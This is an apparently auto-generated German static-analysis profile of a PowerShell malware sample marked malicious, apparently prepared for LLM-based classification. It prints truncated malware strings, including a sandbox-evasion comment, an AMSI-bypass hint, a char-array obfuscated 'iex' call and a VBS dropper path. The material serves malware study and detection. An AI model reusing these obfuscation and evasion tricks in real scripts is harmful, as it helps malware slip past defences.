# Steckbrief: 0f4aeb84826e863ba58695f58e50cfd749373ca46a1832885e3eb3e4b1a6f0c3.ps1

- SHA256: `0f4aeb84826e863ba58695f58e50cfd749373ca46a1832885e3eb3e4b1a6f0c3`
- Groesse: 851766 Bytes, 222 Zeilen
- Ground-Truth-Label (aus Ordner): **malicious**
- Hinweis: Analyse auf erste 200000 Bytes begrenzt
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 8 (Auszug unten)
- Base64-Bloecke gesamt: 0, davon dekodierbar: 0
- Strings (Auszug):
  - `C:\ProgramData\GTZYVDQNGLKWWAYUCNKYHE`
  - `
@echo off
:: Writte file to disk to evade sandbox detection
echo microsoft > %userprofile%\\license.pem
:: AMSI COM`
  - `"
exit

`
  - `
C:\ProgramData\GTZYVDQNGLKWWAYUCNKYHE\GTZYVDQNGLKWWAYUCNKYHE.vbs
$HH = `
  - `
$HHH = "GTZYVDQNGLKWWAYUCNKYHE"
.(-join[char[]](105,101,120))(-join [char[]](36)+[char](82)+[char](68)+[char](84)+[ch`
  - `
KHEDDBTOCZNELZNRTUSRUN= ""&chr(84)&""_
&""&chr(65)&""
VTXNLIZOBTICTXILRVVWAL= ""&chr(83)&""_
&""&chr(82)&""
KNITOY`
  - `
$KHEDDBTOCZNELZNRTUSRUN = "!72^2*!^!*^!3^37^25*^!33^!*^!^234^!5*^25!^*^!43^66^8*^2!5^!99^2**^8*^!44^76^!49^!4*^!53^!5!`
  - `)|&(`

## Stufe 2 - Statische Merkmale (zusaetzlich)
- Pfade: `%D%!h%%U7%`, `%db%a^S%AA%s`, `%db%oW%!h%rS^h%!h%lL`, `%o%db%`, `%userprofile%\\license.pem`, `C:\IDontExist.dll`, `C:\Pr`, `C:\ProgramData\GTZYVDQNGLKWWAYUCNKYHE`
- Cmdlets: Set-Content

## Stufe 3 - Struktur (zusaetzlich)
